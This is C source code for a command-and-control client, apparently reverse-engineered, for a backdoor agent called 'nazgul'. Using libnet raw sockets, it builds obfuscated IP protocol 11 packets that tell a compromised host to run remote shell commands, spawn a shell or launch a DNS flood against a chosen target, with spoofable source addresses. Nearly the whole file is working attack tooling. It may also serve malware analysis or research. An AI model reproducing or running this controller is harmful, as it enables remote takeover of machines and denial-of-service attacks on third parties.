#include <stdio.h>
#include <stdlib.h>
#include <getopt.h>
#include <libnet.h>

#pragma align(1)
typedef union {
	/* The packet size should be >= 200 (included the IP header) */
	u_char x[200];
	struct {
		u_char signature;  /* 0x02 */
		u_char signature2;  /* 0x00 */
		u_char _unused;
		u_char cmd;
		u_char opt[20];
	};
} NAZGUL_PKT;

#define NAZGUL_SIZE 	sizeof(NAZGUL_PKT)
#define NAZGUL_PROTO	11

#define min(x,y)		(x < y ? (x) : (y))

/* Packet structure: (at least, what we understood...)
 * 1 Byte: Command (1..12)
 * 			1 -> Daemon Info (?)
 * 			2 -> Build a packet array (?)
 * 			3 -> /bin/csh <something>
 * 			4 -> Sends something (?)
 * 			5 -> Sends something (?)
 * 			6 -> Spawns a shell on TCP/ (?)
 * 			7 -> /bin/csh <something>
 * 			8 -> Kill the child
 * 			9 -> Sends something (?)
 * 			10 -> synFlood
 * 			11 -> synFlood
 * 			12 -> Sends something (?)
 */

void nazgul_print(NAZGUL_PKT *p)
{
	register int i;
	/* Yeah, the size is what I expected... */
	/* printf("Sz(NAZGUL_PKT)=%d\n",sizeof(NAZGUL_PKT)); */
	for (i = 0; i < min(sizeof(NAZGUL_PKT),40); i++) {
		printf("%x:",p->x[i]);
	}
	printf("\n");
}

/* print error and exit*/
void paramError(char *str)
{
	fprintf(stderr,"%s",str);
	exit(-1);
}

/* build command packet inserting appropriate parameter*/
void nazgul_buildPacket(int cmd, char *hostName, char *remcmd, 
	int opt, int port, int ip1, int ip2, NAZGUL_PKT * nazgul_cmd)
{
	nazgul_cmd->signature = 0x02;
	nazgul_cmd->signature2 = 0x0;
	nazgul_cmd->cmd = cmd;
	
	switch (cmd) {
		case 1:
			/* request server status, no param*/
			break;
		case 2: /*set client ip require ips*/
			nazgul_cmd->opt[0] = opt;
			if (!ip1) 
				paramError("Required optional IP (-p <ip>) for command 2");
			(int) nazgul_cmd->opt[1] = ip1;
			break;
		case 3: /*remote command execution with feedback: require command string*/
			if (!remcmd)
				paramError("Required remote command (-e <str>) for comand 3");
			strncpy(nazgul_cmd->opt, remcmd, 398);
			break;
		case 4: /* dns flood: require ip, port, ev hostname*/
			if (!ip1)
				paramError("Required target IP (-r <ip>) for command 4");
			if (!port)
				paramError("Required port (-p <port>) for command 4");
			if (opt && !hostName) 
				paramError("Required hostname (-n <hostname>) for command 4 when reshostname_flag is set (-o 1)");
			else 
				hostName = "";
			strncpy(&nazgul_cmd->opt[7],hostName, 393);
			(int) nazgul_cmd->opt[0] = ip1;
			(short int) nazgul_cmd->opt[4] = htons(port);
			nazgul_cmd->opt[6] = opt;
			break;
		case 5:
			paramError("Command 5 not yet supported");
			break;
		case 6: /* request shell, no param*/
			break;
		case 7: /* remote command execution: require command string*/
			if (!remcmd)
				paramError("Required remote command (-e <str>) for comand 7");
			strncpy(nazgul_cmd->opt, remcmd, 398);
			break;
		case 8: /* kill server's child if any, no parameter*/
			break;
		case 9:
			paramError("Command 9 not yet supported");
			break;
		case 10:
			paramError("Command 10 not yet supported");
			break;
		case 11:
			paramError("Command 11 not yet supported");
			break;
		case 12:
			paramError("Command 12 not yet supported");
			break;
		default:
			paramError("Command doesn't not exist");
			break;

	}
}



/* The scrambled packet starts with a byte = 2!
 * 
 */
void nazgul_scramble(NAZGUL_PKT *in, NAZGUL_PKT *out)
{
	register int i;
	u_char tmp1, tmp2;
    /* Signature should not be altered */	
	out->x[0] = in->x[0];
	out->x[1] = in->x[1];
		
	out->x[2] = 0;
    sprintf(&out->x[2],"%c",in->x[2] + 23);

    for(i = 3; i < sizeof(NAZGUL_PKT)-2; i++) {
        tmp1 = out->x[i - 1];
        tmp2 = in->x[i];
        tmp2 += (tmp1 + 23);
        out->x[i] = tmp2;
    }
}

void usage(char *name)
{
    printf("%s\t-d x.x.x.x  Destination IP Address [required]\n"
	"\t\t-s source IP Address [required]\n"
	"\t\t-c command  Supplied command [required]\n"
	"\t\t-n symbolic host name (both src or dest, depending on command) \n"
	"\t\t-e remote command to exec \n"
	"\t\t-r target ip \n"
	"\t\t-g spoof ip \n"
	"\t\t-p port \n"
	"\t\t-o option flag \n",name);
    exit(-1);
}

main(int argc, char *argv[])
{
	register int i;
    int c, pkt_size, sock_fd;
	
	int cmd = 0;
	int opt = 0;
	int ip1 = 0;
	int ip2 = 0;
	int port = 0;
    char *dst = NULL;
    char *src = NULL;
	char *hostName= NULL;
	char *remcmd =NULL;
	u_char *pkt = NULL;
	NAZGUL_PKT nazgul_cmd;
	NAZGUL_PKT nazgul_scrambled;
	
	u_long dst_ip;
	u_long src_ip;
    
    while (1) {
		c = getopt(argc, argv, "d:c:s:n:e:o:g:r:");
		if (c == -1) break;
		switch (c) {
			case 'n':
				hostName = strdup(optarg);
				break;
			case 'd' :
				dst = strdup(optarg);
				break;
			case 's' :
				src = strdup(optarg);
				break;
			case 'e':
				remcmd = strdup(optarg);
				break;
			case 'o':
				opt = atoi(optarg);
				break;
			case 'p':
				port = atoi(optarg);
				break;
			case 'c':
				cmd = atoi(optarg);
				break;
			case 'r':
				ip1 = inet_addr(optarg);
				break;
			case 'g' :
				ip2 = inet_addr(optarg);
				break;
			case '?' :
				break;
		}
	}
	
	/* sanity check*/
    if ((cmd <1) || (cmd>12) || (src==NULL) || (dst==NULL))
		usage(argv[0]);
	
    printf("Trying %d on IP:%s from IP:%s\n",cmd, dst, src);
    /* Libnet starts up ... */

	if (!(dst_ip = libnet_name_resolve(dst, LIBNET_RESOLVE))) {
		libnet_error(LIBNET_ERR_FATAL,"Bad destination IP: %s\n",dst);
	}
	
	if (!(src_ip = libnet_name_resolve(src, LIBNET_RESOLVE))) {
		libnet_error(LIBNET_ERR_FATAL,"Bad source IP: %s\n",src);
	}

	pkt_size = LIBNET_IP_H + NAZGUL_SIZE;
	libnet_init_packet(pkt_size, &pkt);
	if ((sock_fd = libnet_open_raw_sock(IPPROTO_RAW)) == -1) {
		libnet_error(LIBNET_ERR_FATAL,
				"Cannot open raw socket; are yoy root?\n");
	}

	
	/* build packet payload*/
	nazgul_buildPacket(cmd, hostName, remcmd, 
		opt, port, ip1, ip2, &nazgul_cmd);
	
	nazgul_print(&nazgul_cmd);
		
	nazgul_scramble(&nazgul_cmd, &nazgul_scrambled);
	nazgul_print(&nazgul_scrambled);

	libnet_build_ip(NAZGUL_SIZE, /* IP payload size		*/
			IPTOS_LOWDELAY, 	 /* TOS 				*/
			242,				 /* IP ID				*/
			0,					 /* Fragment stuff      */
			64,					 /* TTL	                */
			NAZGUL_PROTO,		 /* IP Protocol to use  */
			src_ip,
			dst_ip,
			(u_char*)(&nazgul_scrambled),
			NAZGUL_SIZE,
			pkt);
	
	c = libnet_write_ip(sock_fd, pkt, pkt_size);
	if (c < pkt_size) {
		libnet_error(LIBNET_ERR_WARNING,"libnet_write_ip only sent %d bytes\n",
				c);
	}
	
    return 1;
}
	

